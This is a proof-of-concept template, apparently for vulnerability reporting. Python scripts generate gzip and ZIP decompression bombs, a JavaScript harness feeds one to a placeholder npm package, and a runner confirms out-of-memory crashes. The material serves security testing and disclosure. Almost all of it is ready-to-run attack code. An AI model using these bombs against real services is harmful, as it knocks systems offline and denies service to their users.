# PoC Skeleton -- Decompression Bomb

## Creating a Gzip Bomb

```python
#!/usr/bin/env python3
"""Create a gzip bomb for testing decompression limits."""
import gzip
import io

def create_gzip_bomb(output_size_mb=100):
    """Create compressed data that expands to output_size_mb megabytes."""
    data = b'\x00' * (output_size_mb * 1024 * 1024)  # Zeros compress extremely well
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode='wb', compresslevel=9) as f:
        f.write(data)
    compressed = buf.getvalue()
    print(f'[+] Compressed: {len(compressed)} bytes')
    print(f'[+] Expands to: {output_size_mb} MB')
    print(f'[+] Ratio: {len(data) / len(compressed):.0f}:1')
    return compressed

bomb = create_gzip_bomb(500)  # 500MB expansion
with open('bomb.gz', 'wb') as f:
    f.write(bomb)
```

## JavaScript PoC

```js
/**
 * CVE-CANDIDATE: Decompression Bomb in [package-name] [version]
 * CWE: CWE-409 (Improper Handling of Highly Compressed Data)
 * CVSS: 7.5 HIGH
 */
const pkg = require('[package-name]');
const fs = require('fs');

const bomb = fs.readFileSync('bomb.gz');
console.log('[*] Compressed size:', bomb.length, 'bytes');
console.log('[*] Decompressing...');

const before = process.memoryUsage().heapUsed;
try {
  const result = pkg.decompress(bomb);
  const after = process.memoryUsage().heapUsed;
  console.log(`[+] Decompressed: ${(result.length / 1024 / 1024).toFixed(2)} MB`);
  console.log(`[+] Memory growth: ${((after - before) / 1024 / 1024).toFixed(2)} MB`);
} catch (e) {
  console.log('[!] Error:', e.message);
}
// Process likely OOM killed before reaching this point
```

## ZIP Bomb

```python
#!/usr/bin/env python3
"""Create a ZIP bomb."""
import zipfile
import io

def create_zip_bomb():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        # Single file that expands massively
        zf.writestr('bomb.txt', b'\x00' * (100 * 1024 * 1024))
    buf.seek(0)
    with open('bomb.zip', 'wb') as f:
        f.write(buf.read())
    print(f'[+] Created bomb.zip: {buf.tell()} bytes compressed')

create_zip_bomb()
```

## Measuring Memory Growth

```python
#!/usr/bin/env python3
import subprocess, sys

result = subprocess.run(
    ['node', 'poc.js'],
    capture_output=True, timeout=30
)
if result.returncode == -9:
    print('[+] CONFIRMED: OOM kill -- decompression bomb successful')
elif result.returncode == -6:
    print('[+] CONFIRMED: SIGABRT -- memory allocation failure')
else:
    print(f'[*] Exit code: {result.returncode}')
    print(result.stdout.decode())
```
